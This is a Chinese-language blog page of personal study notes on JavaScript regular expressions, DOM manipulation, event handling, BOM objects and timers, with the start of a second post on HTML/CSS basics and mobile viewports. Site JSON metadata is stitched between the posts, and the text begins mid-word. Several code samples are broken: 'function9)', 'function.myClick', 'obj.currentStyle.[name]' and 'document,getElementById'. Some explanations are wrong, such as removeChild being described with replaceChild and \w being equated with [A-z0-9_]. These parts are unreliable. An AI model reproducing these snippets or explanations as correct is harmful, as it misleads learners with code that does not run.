Expression，又称规则表达式）用于定义一些字符串的规则，计算机可以根据正则表达式检查一个字符串是否符合规则，将字符串中符合规则的内容提取出来。通过var 变量 = new RegExp(&quot;正则表达式&quot;，&quot;匹配模式&quot;);创建正则表达式的对象。还可以使用字面量创建正则表达式var 变量 = /正则表达式/匹配模式。使用字面量方式创建更加简单，使用构造函数创建更加灵活。使用typeof检查正则对象返回object。使用test()方法检查一个字符串是否符合正则表达式的规则，如果符合返回true。 使用竖线|表示或者的意思，中括号[]里的内容也是或的意思，[ab]&#x3D;&#x3D;a|b。[a-z]表示任意小写字母，大写字母同理。[A-z]表示任意字母（严格来说ASCII标里A-z中间有六个其他字符）。可以使用/a[bde]c/检查一个字符串中是否含有abc或adc或aec。[^ ]表示除了，只要有除了中括号内符号的其他符号就是true。 在正则表达式中使用\\作为转义字符，用\\.表示.，用\\\\表示\\。正则表达式中的.，\\等特殊字符需要在前面加上\\进行转义。 注意使用构造函数时，由于它的参数是一个字符串，而\\是字符串中的转义字符，如果要使用\\也需要使用\\\\代替。 还有一些带转义字符的元字符。1.\\w：任意字母数字下划线，相当于[A-z0-9_]。\\W：和\\w相反，表示[^A-z0-9_]。（word）2.\\d：任意数字。\\D：除了数字。（digital）3.\\s：空格。\\S：除了空格。（space）4.\\b：单词边界。B同理。（bound）比如检查一个字符串中是否含单词child可以使用reg = /\\bchild\\b/。 其实\\b的作用不只是检查空格，实际上是检查以“半角英数字+下划线”构成的词汇前后存在“非词汇构成元素”（即\\W）的情况，比如“hello%child#”，“hello【child】”这些都能排查出来。 在构造函数中可以传递一个匹配模式作为第二个参数。i：忽略大小写；g：全局匹配模式。可以为一个正则表达式设置多个匹配模式，顺序无所谓。 1234var reg = new RegExp(&quot;a&quot;，&quot;i&quot;); // 检查一个字符串中是否含a/Avar reg = /a/i; // 和上面一行效果相同var str = &quot;a&quot;;console.log(reg.test(&quot;a&quot;)); 正则相关的字符串方法使用split()：将字符串拆分为数组。需要一个字符串作为参数，将会根据该字符串去拆分数组。如果传递空串作为参数，则会将每个字符都拆分为数组中的一个元素。可以传递一个正则表达式作为参数，这样方法将会根据正则表达式去拆分字符串。该方法即使不指定全局匹配也会全部拆分。 使用search()：搜索字符串中是否含有指定内容。如果搜索到指定内容，返回第一次出现的索引；如果没有搜索到就返回-1。可以接受一个正则表达式为参数，根据正则表达式去检索字符串。str = [hello abc afc]; result = str.search(/a[bef]c/)。该方法即使指定全局匹配也只查找第一个。 使用match()：根据正则表达式从一个字符串中将符合条件的内容提取出来。默认情况下match只会找到第一个符合要求的内容，找到以后就停止检索。可以设置正则表达式为全局匹配模式，这样就会匹配到所有的内容。match会将匹配到的内容封装到一个数组中返回，即使只查询到一个结果。 使用replace()：将字符串中的指定内容替换为新的内容。第一个参数：被替换的内容，可以接受一个正则表达式作为参数；第二个参数：新的内容。默认只会替换第一个，指定匹配模式含g可以实现全部替换。第二个参数指定为空串则会删除指定内容。 利用replace()方法去除字符串 he llo 的空格去掉开头的空格：str = str.replace(/^\\s*/,&quot;&quot;);去掉结尾的空格：str = str.replace(/\\s*$/,&quot;&quot;);去掉开头和结尾的空格：str = str.replace(/^\\s*｜\\s*$/g,&quot;&quot;);。其中的两个星号换成加号也可。 量词使用量词设置一个内容出现的次数。需要注意的是量词只对它前边的一个内容起作用，通过括号指定需要重复的组合。{n}，如&#123;(ab)n&#125;，ab正好出现n次。{m,n}，如&#123;ab&#123;m,n&#125;c&#125;，b出现m到n次。{m,}，出现m次以上。+，至少一个。相当于{1,}。*，0个或多个，相当于{0,}。？，0个或一个，相当于{0,1}。^，表示开头。如&#123;^a&#125;，以a开头。$，表示结尾。如&#123;a$&#125;，以a结尾。如果在正则表达式中同时使用^和$则要求字符串必须完全满足正则表达式。 比如创建一个用来检查字符串是否为合法手机号的正则表达式。规则：以1开头+第二位为3-9的任意数字+含第三位的九个任意数字。^1[3-9][0-9]&#123;9&#125;$ 邮件的正则例如&#104;&#x65;&#108;&#108;&#111;&#x2e;&#110;&#105;&#104;&#97;&#111;&#64;&#97;&#98;&#99;&#x2e;&#99;&#111;&#x6d;&#x2e;&#x63;&#110; 注意量词的使用！ 规则：任意字母数字下划线(3位以上) .任意字母下划线(可选) @ 任意字母数字 .任意字母（2-5位） .任意字母（2-5位）。分别对应：/\\w&#123;3,&#125;/ /(\\.\\w+)*/ /@/ /[A-z0-9]/+ /\\.[A-z]&#123;2,5&#125;/ /\\.[A-z]&#123;2,5&#125;/组合起来：/\\w&#123;3,&#125;(\\.\\w+)*@[A-z0-9]+(\\.[A-z]&#123;2,5&#125;)&#123;1,2&#125;/。但这样写存在问题，还需要加开始和结束符号做严格的限制：/^\\w&#123;3,&#125;(\\.\\w+)*@[A-z0-9]+(\\.[A-z]&#123;2,5&#125;)&#123;1,2&#125;$/。 DOMDocument Object Model，文档对象模型。用处就是可以让人用JS对HTML文档进行操作。文档：整个HTML网页文档对象：网页中的每一个部分都转换成了一个对象。（转换为对象后就可以使用纯面向对象的方式操作网页）模型：使用模型表示对象间的关系，方便获取对象。 节点Node，是构成网页的最基本的组成部分，网页中的每个部分都可以称为是节点，如html标签、属性、文本、注释、整个文档等。虽然都是节点但具体类型不同。节点类型不同属性和方法也不尽相同。常用节点分为四类： “文档节点”：整个HTML文档 “元素节点”：HTML文档中的HTML标签（元素就是标签） “属性节点”：元素的属性 “文本节点”：HTML标签中的文本内容可以使用innerHTML获取元素内部的HTML内容；innerText获取元素内部的文本内容，它和innerHTML类似，不同的是它会自动将HTML标签去除。 123456789101112![节点属性](shuxing.png)浏览器已经为我们提供了文档节点对象，文档节点代表的是整个网页。这个对象是window属性，可以在页面中直接使用。```html&lt;button id=&quot;btn&quot; onclick=&quot;alert(&#x27;按钮已点击&#x27;)&quot;&gt;我是一个按钮&lt;/button&gt;&lt;script&gt; // 获取到button对象 var btn = document.getElementById(&quot;btn&quot;); console.log(btn); // [object HTMLButtonElement] // 修改按钮的文字 btn.innerHTML = &quot;新的文字内容&quot;&lt;/script&gt; 文档的加载浏览器加载页面时按照自上而下的顺序，读取到一行运行一行。如果将script标签写到页面的上边，那么在代码执行时页面还没有加载，页面没加载那么DOM对象也没加载，会导致无法获取到DOM对象。将js代码编写到页面下部就是为了可以在页面加载完毕后再执行js代码。 onload事件对应的响应函数会在整个页面加载完成后才会触发。可以为window绑定一个onload事件window.onload = function9)&#123;&#125;以确保代码执行时所有的DOM对象已经加载完毕了，不会出现获取不到的情况。如果把js代码写在html文档的head中可以把它们都放在onload事件内。 事件文档或浏览器窗口中发生的一些特定交互瞬间。可以在事件对应的属性中编写一些js代码。类似上文中&lt;button id=&quot;btn&quot; onclick=&quot;alert(&#39;已点击&#39;)&quot;&gt;我是按钮&lt;/button&gt;的写法称为结构和行为耦合，不方便维护，不推荐使用。可以为按钮的对应事件绑定处理函数的形式来响应事件。当事件被触发时，其对应的函数将会被调用。像onclick这种为单机事件绑定的函数称为单机响应函数。 12345678910111213141516171819&lt;button id=&quot;btn&quot;&gt;我是一个按钮&lt;/button&gt;&lt;script&gt;// idStr：要绑定单机响应函数的对象的id属性值；fun：事件的回调函数function.myClick(idStr,fun)&#123; // 获取到button对象 var btn = document.getElementById(idStr); btn.onclick = fun;&#125;;myClick(mybtn,function()&#123; // 获取id为element1的元素 var ele1 = document.getElementById(&quot;element1&quot;); // 返回#element1的前一个兄弟节点（如果HTML文档内有换行，也可能获取到空白文本） var ps = ele1.previousSibling; alert(ps.innerHTML); // 使用previousElementSibling获取前一个兄弟元素，IE8以下不支持 var pe = ele1.previousElementSibling; &#125;);&lt;/script&gt; 常用的函数还有onscroll，该函数会在元素的滚动条滚动时触发；onmousemove，该事件会在鼠标在元素移动时触发； 事件对象在IE8及以下浏览器中，响应函数被触发时浏览器不会传递事件对象，而是将事件对象作为window对象的属性保存的。需要用var x = window.event.clientX;的形式调用。 event中的属性target表示触发事件的对象，用event.target.xxx的形式调用。 当事件的响应函数被触发时，浏览器每次都会将一个事件对象作为实参传递给响应函数。在事件对象中封装了当前事件相关的一切信息，比如鼠标的坐标、键盘哪个案件按下、鼠标滚轮的方向等。 1234567891011areaDiv.onmousemove = function(event)&#123; /*可以使用这种方法兼容IE if(!event)&#123; event = window.event; &#125;*/ //解决事件对象兼容性问题的方法:利用JS中的或语句，前者为true直接赋值，前者为false返回第二个值。 event = event || window.event; var x = event.clientX; var y = event.clientY; showMsg.innerHTML = &quot;x=&quot; + x + &quot;, y=&quot; + y;&#125; DOM查询的常见方法 元素节点，通过document对象调用方法getElementById()、getElementsByTagName()、getElementsByName()分别是通过id属性、标签名和name属性获取元素节点对象。其中通过id属性一定是获取唯一的对象，其他方法可以获取一组对象。方法getElementsByClassName()会返回一个 类数组 对象，返回当前节点的指定class属性值查询一组元素节点对象，但不支持IE8及以下。方法getElementsByTagName()会返回一个 类数组 对象，所有查询到的元素都会封装到对象中。主要用来操作表单。（类数组就是HTMLCollection）方法getElementsByName()应该注意，由于innerHTML用于获取元素内部的HTML代码，所以对于自结束标签没有意义。 读取元素节点的属性：直接使用元素.属性名。但读取class属性不能使用这种方式，而应该使用元素.className。（class是js中的保留字） 元素节点的子节点，通过具体的元素节点调用方法getElementsByTagName()，返回当前节点的指定标签名后代节点。返回一个 类数组 对象。属性childNodes，表示当前节点的所有子节点。返回一个 类数组 对象。该属性会获取包括文本节点在内的所有节点。 根据DOM标签，标签间的空白也会被当成文本节点！属性children获取当前元素的所有子元素。属性firstChild，表示当前节点的第一个子节点。属性firstElementsChild，获取当前元素的第一个子元素。属性lastChild，表示当前节点的最后一个子节点。 注意属性和方法使用方式的不同。 父节点和兄弟节点，通过具体的节点调用属性parentNode，表示当前节点的父节点。属性previousSibling，表示当前节点的前一个兄弟节点。如果HTML文档内有换行，也可能获取到空白文本。属性previousElementSibling，获取前一个兄弟元素，IE8以下不支持。属性nextSibling，表示当前节点的后一个兄弟节点。 选择器作为参数方法document.querySelector()需要一个选择器作为参数，可以根据一个CSS选择器来查询一个元素节点对象。使用该方法只能返回唯一的一个元素，如果满足条件的元素有多个，那么它只会返回第一个。可以使用document.querySelectorAll()，它与上面的方法类似，不同的是它会将符合条件的元素封装到一个数组中返回。即使符合条件的元素只有一个也会返回数组。 12345678910&lt;body&gt; &lt;div class=&quot;box1&quot;&gt; &lt;div&gt;这是box1中的div&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; var div = document.querySelector(&quot;.box1 div&quot;); console.log(div.innerHTML);&lt;/script&gt; document中的其它属性属性body，它保存的是&lt;body&gt;``i`的引用。 属性html，它保存的是根标签&#96;&#96;i&#96;的引用。属性all，代表页面中的所有元素。document.all和document.getElementByTagName含义相同。 DOM增删改 使用innerHTML也可以完成DOM增删改的相关操作，但动作太大了，会把更大部分的HTML代码标记为修改过的状态。所以一般会两种方式结合使用。 document.createElement()用于创建一个元素节点对象，需要一个标签名作为参数，根据该标签名创建元素节点对象，并将创建好的对象作为返回值返回。 document.createTextNode()用于创建一个文本节点对象，需要一个文本内容作为参数，根据该内容创建文本节点，并将创建好的节点作为返回值返回。 .appendChild()用于向一个父节点中添加一个新的子节点。用法：父节点.appendChild(子节点)。 .insertBefore()用于向指定的 子节点 前插入新的子节点，因此调用该方法的一定是父元素。用法：父节点.insertBefore(新的子节点，指定的子节点)。 replaceChild()用于替换子节点，因此调用该方法的一定是父元素。用法：父节点.replaceChild(新的子节点，指定的子节点)。 removeChild()用于删除子节点，因此调用该方法的一定是父元素。用法：父节点.replaceChild(子节点)。一种更方便的、不用请它的父元素的方式：子节点.parentNode.replaceChild(子节点)。 123456789101112131415161718window.onload = function()&#123; myClick(&quot;mybtn&quot;,function()&#123; // 创建广州节点&lt;li&gt;广州&lt;/li&gt; var li = document.createElement(&quot;li&quot;); // 创建li元素节点 var gzText = document.createTextNode(&quot;广州&quot;); // 创建广州文本节点 li.appendChild(gzText); // 将gzText设置为li的子节点 var city = document.getElementById(&quot;city&quot;); // 将广州添加到city下 city.appendChild(li); &#125;)&#125; // 也可以直接利用innerHTML var city = document.getELementById(city); city.innerHTML += &quot;&lt;li&gt;广州&lt;/li&gt;&quot;; // 两种方法结合【推荐】 var li = document.createElement(&quot;li&quot;); li.innerHTML = &quot;广州&quot;; var city = document.getElementById(&quot;city&quot;); city.appendChild(li); 使用DOM操作CSS 能起到修改样式的只有style属性！ 通过JS修改元素的样式：元素.style.样式名 = 样式值。这里的样式值需要传入字符串，如”200px”。通过style属性设置的样式都是内联样式，而内联样式具有较高的优先级，所以通过JS修改的样式往往会立即显示。但如果在样式中写了!important那么它就会有最高优先级，即使通过JS也不能覆盖该样式，会导致JS修改样式失效。所以尽量别为样式添加!important。 如果CSS的样式名中含有减号”-“，如background-color，这种名称在JS中不合法。需要将这种样式名修改为驼峰命名法：去掉减号，然后将减号后的字母大写。 通过JS读取元素的样式：元素.style.样式名。 通过style属性读取到的都是内联样式！无法读取样式表中的样式。 读取元素的样式通过style属性读取到的都是内联样式，无法读取样式表中的样式。 （只有IE支持) 获取元素的当前显示的样式：元素.currentStyle.样式名。如果当前元素没有设置样式，则获取它的默认样式。 其它浏览器获取元素的当前显示的样式：元素.getComputedStyle()。这个方法是window的方法，可以直接使用。需要两个参数，第一个：要获取样式的元素，第二个：可以传递一个伪元素，很少用，一般都传null。该方法会返回一个对象，对象中封装了当前元素对应的样式。可以通过对象.样式名读取样式。如果获取的样式没有设置，则会获取到真实的值，而不是默认值。比如：没有设置width，它不会获取到auto，而是获取到实际的长度，和显示器大小、人为缩放都有关系。该方法不支持IE8及以下的浏览器。通过currentStyle和getComputedStyle()读到的样式都是只读的，不能修改。如果修改必须通过style属性。形如box1.currentStyle.width = &quot;200px&quot;的写法是行不通的。 总之，正常浏览器：getComputedStyle(box1,null).backgroundColorIE：如box1.currentStyle.backgroundColor 可以定义一个通用的函数，用来获取元素的当前的样式。需要两个参数：obj，要获取样式的元素；name，要获取的样式名。 123456789101112getStyle(box1,&quot;width&quot;);function getStyle(obj,name)&#123; if(window.getComputedStyle)&#123; // 加上window.，代表是以属性的形式调用。 // 不加就是变量 // 变量没有会报错，属性没有会报undefined return getComputedStyle(obj,null)[name]; // 正常浏览器的方式。这里注意由于name传入的是变量，所以需要用中括号的语法。 return obj.currentStyle.[name]； // IE8的方式 // 也可以用？ ：表达式整合成一条语句。 &#125;&#125; 其它样式操作的属性 这些 属性 都是不带px单位的，返回的只是数字，可以直接进行计算 属性clientX、clientY可以获取鼠标指针在当前可见窗口的坐标。 属性pageX、pageY可以获取鼠标指针在当前页面的坐标。 属性clientWidth、clientHeight：获取元素的可见宽度和高度。包括内容区和内边距，不包括边框。该属性是只读的，不能修改，想修改只能用style属性。 属性offsetWidth、offsetHeight：获取元素的整个宽度和高度。包括内容区、内边距和边框。。&#x2F;÷÷÷÷÷÷÷、 属性offsetParent：获取当前元素的最近的开启了定位的父元素。（定位默认static。）如果所有的祖先元素都没开启定位，返回body。 属性offsetLeft、offsetTop：获取当前元素相对于其定位父元素的水平、垂直 属性scrollHeight、scrollWidth：获取元素的滚动高度&#x2F;宽度。也就是整个滚动区域的高度&#x2F;宽度。（通过overflow：auto添加滚动条） 属性scrollLeft、scrollTop：获取水平&#x2F;垂直滚动条滚动的距离。Chrome认为浏览器的滚动条是body的，可以通过body.scrollTop获取；但事实上，滚动条出现是因为父元素容不下它，所以应该用body的父元素html获取。用var st = document.body.scrollTop || document.documentElement.scrollTop解决这个问题。 满足scrollHeight - scrollTop &#x3D;&#x3D; clientHeight说明垂直滚动条滚动到底。 事件的冒泡、委派、绑定和传播 向上冒泡，向下委派。 事件的冒泡冒泡（bubble）指的就是事件的向上传导，当后代元素的事件被触发时，其祖先元素的 相同事件 也会被触发。开发中，大部分情况下的冒泡都是有用的，如果不希望发生事件冒泡可以将事件对象的cancelBubble设置为true。 123456s1.onclick = function(event)&#123; event = event || window.event; // 取消冒泡：可以将事件对象的cancelBubble设置为true。 event.cancelBubble = true;&#125; 事件的委派场景：希望只绑定一次事件即可应用到多个元素上，即使元素是后添加的。可以尝试将其绑定给元素的共同的祖先元素。 事件的委派：指将事件统一绑定给元素的共同的祖先元素，这样当后代元素上的事件触发时，会一直冒泡到祖先元素。从而通过祖先元素的响应函数来处理。事件委派利用了冒泡，可以减少事件绑定的次数，提高程序的性能。 事件的绑定使用对象.事件 &#x3D; 函数的方法绑定响应函数，只能同时为一个元素的一个事件绑定一个响应函数，不能绑定过个，否则后面的会覆盖掉前面的。 通过addEventListener()方法也可以为元素绑定响应函数（IE8以上。IE8及以下用attachEvent()绑定事件，用法一样，除了第一个参数需要on和执行顺序相反。）。可以同时为一个元素的相同事件同时绑定多个响应函数，这样当事件触发时，响应函数将会按照函数绑定的顺序执行。参数：1.事件的字符串，不要on。比如onclick在这里写作click。2.回调函数，当事件触发时该函数会被调用。3.是否在捕获阶段触发事件，需要一个布尔值，一般都传false。 此外，addEventListener()的this是绑定事件的对象（如下面的btn01），attachEvent()中的this则是window。 123456btn01.addEventListener(&quot;click&quot;,function()&#123; alert(1);&#125;,false);btn01.addEventListener(&quot;click&quot;,function()&#123; alert(2);&#125;,false) 为了解决浏览器的兼容性问题，定义一个函数用来为指定元素绑定响应函数。需要注意addEventListener()中的this是绑定事件的对象，attachEvent()中的this是window，需要统一两个方法中的this。这里使用call()方法改变函数执行时的this，这个方法是函数对象的方法，需要通过函数对象来调用，所以我们在它外面套一层匿名函数。实现的效果是一样的，但满足了call的使用条件，再使用call修改this的指向。 12345678910111213141516// 三个参数分别为要绑定事件的对象，事件的字符串和回调函数// 由于拼串更为容易，所以第二个参数传的是没有on的function bind(obj,eventStr,callback)&#123; if(obj.addEventListener)&#123; // 大部分浏览器兼容的方式 obj.addEventListener(eventStr,callback,false); &#125;else&#123; // IE8及以下 // this是谁由调用方式决定。 // 原本的调用方式：obj.attachEvent(&quot;on&quot; + eventStr,callback) obj.attachEvent(&quot;on&quot; + eventStr,function()&#123; // 在匿名函数中使用回调函数以满足call的适用条件 callback.call(obj); &#125;) &#125;&#125; 事件的传播关于时间的传播，网景公司和微软公司有不同的理解：微软认为事件应该是由内向外传播，也就是当事件触发时应该先触发当前元素上的事件，然后再向当前元素的祖先元素上传播，也就是时间应该在冒泡阶段执行；网景公司认为事件应该由外向内传播，也就是当事件触发时应该先触发当前元素最外层的祖先元素的事件，然后再向内传播到后代元素，也就是时间应该在捕获阶段执行。 W3C综合了两个公司的方案，将事件传播分成了三个阶段： 捕获阶段：捕获阶段时从最外层的祖先元素向目标元素进行事件的捕获，但是默认捕获阶段内不会触发事件 目标阶段：事件捕获到目标元素，捕获结束开始在目标元素上触发事件 冒泡阶段：事件从目标元素向他的祖先元素传递，依次触发祖先元素上的事件 如果希望在捕获阶段就触发事件，可以将addEventListener()的第三个参数设置为true。一般情况下我们不会希望在捕获阶段触发事件，所以这个参数一般都是false。在IE8及以下的浏览器中没有捕获阶段。 方法setCapture()：调用一个元素的setCapture()方法以后，这个元素将会把下一次所有的鼠标按下相关的事件捕获到自身上。（流氓网站）方法releaseCapture()实现当鼠标松开时，停止对对象的捕获。这两个方法只有IE支持，火狐中不会报错，chrome会报错。可以用box1.setCapture &amp;&amp; box1.setCapture()实现浏览器兼容。 键盘事件 键盘事件通常绑定给可以获取到焦点的对象或document 按键被按下onkeydown。如果一直按住某个按键不松手事件会一直触发，为了防止误操作，第一次和第二次间隔会稍微长一点，其它的都很快。按键被松开onkeyup。【尽量避免使用】可以通过keyCode属性获取按键的ASCII编码。alert(event.keyCode)。现在是key属性。 实例：鼠标拖拽 当鼠标在被拖拽元素上按下时，开始拖拽—— onmousedown 当鼠标移动时，被拖拽元素跟随鼠标移动—— onmousemove 当鼠标松开时，被拖拽元素固定在当前位置—— onmouseup 12345678910111213141516171819202122232425var box1 = document,getElementById(&quot;box1&quot;);box1.onmousedown = function()&#123; // 鼠标按下，开始拖拽 event = event || window.event; // div的偏移量：鼠标.clientX - 元素.offsetLeft，Y和top同理 var ol = event.clientX - box1.offsetLeft; var ot = event.clientY - box1.offsetTop; document.onmousemove = function(event)&#123; // 注意这里是给document绑定 event = event || window.event; var left = event.clientX - ol; var top = event.clientY - ot; box1.style.left = left + &quot;px&quot;; // 修改位置。记得开绝对定位。 box1.style.top = top + &quot;px&quot;; &#125;; document.onmouseup = function()&#123; // 给document绑定。给box1绑定，如果页面有其他元素并且恰好在其他元素的范围内松开鼠标会有bug，因为触发的是其他元素的onmouseup // 取消onmousemove的效果。但如果只有这句也有bug，鼠标在页面其他地方点击也会触发 document.onmousemove = null; // 取消onmouseup document.onmouseup = null; &#125;; // 当拖拽一个网页中的内容时，浏览器会默认去搜索引擎中搜索内容，会导致拖拽功能异常。 // 这个是浏览器提供的默认行为，如果不希望发生可以通过return false取消默认行为。&#125;; BOM浏览器对象模型。BOM可以使我们通过JS操作浏览器，BOM中为我们提供了一组对象用来完成对浏览器的操作。常见的BOM对象如下： Window：代表整个浏览器的窗口，同时window也是网页中的全局对象。 Navigator：代表当前浏览器的信息，通过该对象可以识别不同的浏览器。由于历史原因，Navigator对象中的大部分属性都已经不能帮助我们识别浏览器了。一般我们只会用userAgent（这词等价于浏览器）来判断浏览器的信息。userAgent是一个含有用来描述浏览器信息的字符串，不同浏览器有不同的userAgent。如果userAgent还不能判断，可以通过一些浏览器中特有的对象来判断浏览器的信息。 Location：当前浏览器的地址栏信息，通过该对象可以获取地址栏信息或操作浏览器跳转页面。直接打印location则可以获取到地址栏的信息（当前页面的完整路径）。 如果直接将location属性修改为一个完整的路径或相对路径，则页面会自动跳转到该路径，并且会生成相应的历史记录。方法assign()：用来跳转到其他的页面，作用和直接修改location一样方法reload()：重新加载当前页面，作用和刷新一样。如果在方法中传递一个true作为参数，则会强制清空缓存并刷新页面。方法replace()：使用一个新的页面替换当前页面，调用完毕也会跳转页面。但和直接修改location属性不同的是，它不会生成历史记录，不能回退。 History：代表浏览器的历史记录，通过该对象不能获取到具体的历史记录，只能操作浏览器向前或向后翻页，而且该操作只在当次访问时有效。属性length：获取到当前访问的链接数量方法back()：回退到上一个页面，作用和浏览器的回退按钮一样方法forward()：回退到下一个页面，作用和浏览器的前进按钮一样方法go()：跳转到指定页面，需要一个整数作为参数——1:向前跳转一个，相当于forward；其它正整数同理。负数就是回退。 Screen：代表用户的屏幕信息，通过该对象可以获取到用户显示器的相关信息（主要用在移动端） 虽然描述的时候大写，但用起来的时候都是小写 这些BOM对象在浏览器中都是作为window对象的属性保存的，都是全局对象。可以通过window对象来使用，由于是全局对象也可以直接使用。console.log(window.location)和console.log(location)都行。 定时器 方法setInterval()：将一个函数每隔一段时间执行一次。参数——1.回调函数，该函数会每隔一段时间被调用一次；2.调用的间隔时间，单位ms返回值——一个Number类型的数据，从1开始。这个数字用来作为定时器的唯一标识。 123setInterval(function()&#123; count.innerHTML = num++;&#125;,300) 很多情况下，要想不出错需要在开启定时器之前将 当前元素 上的其它定时器关闭 方法clearInterval()用来关闭定时器，传入的参数即是定时器的标识。参数——它可以接受任意参数，都不会报错。如果参数是一个有效的定时器的标识，则停止对应的定时器；如果参数不是有效的标识就什么都不做。 12345678910111213141516171819202122var imgArr = [&quot;1.jpg&quot;,&quot;2.jpg&quot;,&quot;3.jpg&quot;];var index = 0; // 保存当前图片的索引var timer; // 保存定时器的标识var btn01 = document.getElementById(&quot;btn01&quot;); // btn01是开始按钮btn01.onclick = function()&#123; // 解决：每点击一次按钮就会开启一个定时器，点击多次就会开启多个定时器，会导致图片切换速度过快，并且由于timer的值会被刷新就只能关闭最后一次开启的定时器的问题 // 在开启定时器之前将当前元素上的其它定时器关闭 clearInterval(timer); timer = setInterval(function()&#123; index++; // 判断索引是否超过最大索引 if(index &gt;= imgArr.length)&#123; index = 0; &#125; img1.src = imgArr[index]; &#125;,1000);&#125;;var btn02 = document.getElementById(&quot;btn02&quot;); // btn02是结束按钮btn02.onclick = function()&#123; clearInterval(timer);&#125;;","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"HTML/CSS笔记","slug":"HTML-CSS笔记","date":"2022-01-09T13:41:50.000Z","updated":"2022-01-09T13:41:50.000Z","comments":true,"path":"2022/01/09/HTML-CSS笔记/","link":"","permalink":"https://avalooooooon.github.io/2022/01/09/HTML-CSS%E7%AC%94%E8%AE%B0/","excerpt":"","text":"HTML w3school的标签文档：tagsMDN的标签文档: tags Vscode安装的扩展：Live Server； 在浏览器中，检查元素的elements窗口显示的是代码在内存中的结构 HTML基本结构 vs code中新建.html文件，输入一个感叹号后直接tab可一键生成一个最简单的HTML模版。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang = &quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt; &lt;/title&gt; &lt;style&gt; /* css中的注释 */ nav,article,aside&#123; float:left; &#125; ul&#123; margin:0; list-style:none; &#125; &lt;/style&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/reset.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;header&gt; &lt;span&gt;&lt;/span&gt; &lt;/header&gt; &lt;main&gt; &lt;nav&gt;&lt;/nav&gt; &lt;article&gt;&lt;/article&gt; &lt;aside&gt;&lt;/aside&gt; &lt;/main&gt; &lt;footer&gt; &lt;span&gt;&lt;/span&gt; &lt;/footer&gt; &lt;ul&gt; &lt;li&gt; &lt;a href=&quot;javascript:;&quot;&gt; &lt;/a&gt; &lt;li&gt; &lt;li&gt; &lt;li&gt; &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; &lt;DOCTYPE&gt;:文档声明，用来告诉浏览器当前网页的版本（语法规范）。就是html5的文档声明。 &lt;html&gt;: html的根标签，除了文档声明，所有内容都要写在根元素内；lang &#x3D; “en”指定网页语言为英语，会触发浏览器的翻译功能，设置为zh则不会触发翻译 &lt;head&gt;: 给搜索引擎看帮助其解析网页，其中的内容不会出现在网页中 &lt;meta&gt;: 用来设置网页的元数据（与生俱来的、不会变的、底层的数据），也是给搜索引擎看的；可以通过该标签设置网页字符集charset(utf-8)；name；keywords是网站关键字，给搜索引擎分类网站的；description，介绍网站，会显示在搜索引擎搜索的结果中；title，作为搜索结果超链接中的文字显示。 &lt;title&gt;: 网页标题，在标题栏出现 &lt;body&gt;: 需要展示的所有内容都在其中 &lt;div&gt;: 没有语义，表示一个区块，是主要的布局元素 &lt;span&gt;: 没有语义，表示一个行内元素，是主要的布局元素 HTML属性属性是一个 名值对（x&#x3D;y，即color&#x3D;”red”），属性值应该使用引号引起来，可以是单引号也可以是双引号，但要一致。属性用来设置标签中的内容如何显示， HTML实体（转义）如需要在网页中书写特殊符号（多个连续空格、内容两侧的大于号和小于号），需要使用HTML中的实体（转义字符）。语法：&amp;实体的名字;。如，空格：&amp;nbsp;，多个连续空格可以写成&amp;nbsp;&amp;nbsp;&amp;nbsp;，大于号：&amp;gt;，小于号：&amp;lt; 在w3school:html实体中查询更多。 CSS层叠样式表。声明块中的声明是名值对，名和值用冒号连接。如color:red。注意这里CSS中的名值对用冒号链接；html中的属性值用的则是等号，如color=red。 样式的继承：为一个元素设置样式的同时也会应用到它的后代元素上。但背景相关的、布局相关的等一些样式不会被继承。 内联（行内）样式： 开发时不要使用内联样式！ 内部样式表：将样式全部写到&lt;head&gt;内的&lt;style&gt;标签里。 外部样式表：将样式写到外部的xxx.css文件中，再通过&lt;link&gt;标签引入。 浏览器的默认样式1234*&#123; margin:0; padding:0;&#125; 或者：使用重置样式表：style.css直接全部去除了浏览器的默认样式，normalize.css对不同浏览器的默认样式进行了统一。 长度和颜色单位 长度 像素（px）：根据屏幕不同而不同，像素越小的屏幕越清晰。同样的200px在不同设备下显示效果不同。 百分比：是相对其父属性而言。可以使子元素跟随父元素的改变而改变。 em：相对于当前元素（自身）的font- size。1em&#x3D;1font-size。一般浏览器默认的字体大小都是16px，所以10em就是160px。会根据字体大小的改变而改变。 rem：相对于根元素（&lt;html&gt;标签）的font- size。 vw：视口宽度（viewport width）。 颜色 RGB值：rgb(红色,绿色,蓝色) RGBA值：rgba(红色,绿色,蓝色,.5)，第四个是透明度：1为完全不透，0为完全透明，.5为半透明 16进制值：#FFFFFF。两两重复可以简写。 HSL值：（同理有HSLA，色相：0～360+饱和度：颜色浓度0%～100%+亮度：0%～100%+透明度） 像素、（移动端）完美视口 移动端默认的视口大小是980px(css像素)。所以默认情况下，移动端的像素比就是980&#x2F;移动端宽度（980&#x2F;760，iPhone6），也就是一个css像素对应零点几个移动端的物理像素。又因为移动端的物理像素本来就小，所以如果我们直接在网页中编写移动端代码，在980的视口中像素比会很不好，导致网页中的内容很小。这就要求编写移动页面时必须确保有一个比较合理的像素比。 每一款移动设备设计时都会有一个最佳的像素比，一般把像素比设置为该值就可得到最佳效果。将像素比设置为最佳像素比的视口大小我们称其为完美视口。不同设备完美视口的大小不同：iPhone6-375px，iPhone6 plue-414px。由于不同设备视口和像素比不同，所以同样的375像素在不同设备下意义不同，比如在iPhone6中375是全凭，在plus中就会缺一块。所以在移动端开发时就不能再使用px进行布局了。 可以通过&lt;meta&gt;标签设置视口大小。&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;就把网页的视口设置为完美视口。总之就是再写移动端的页面时就把这句先写上。 移动端开发解决比例问题的最终方案使用less+rem的方法，换算设计图px和代码rem的比例。 12345678// total-width是设计图的宽度@total-width:750; html&#123; font-size:(100vw/@total-width)*40;&#125;.box&#123; height:175/40rem; // 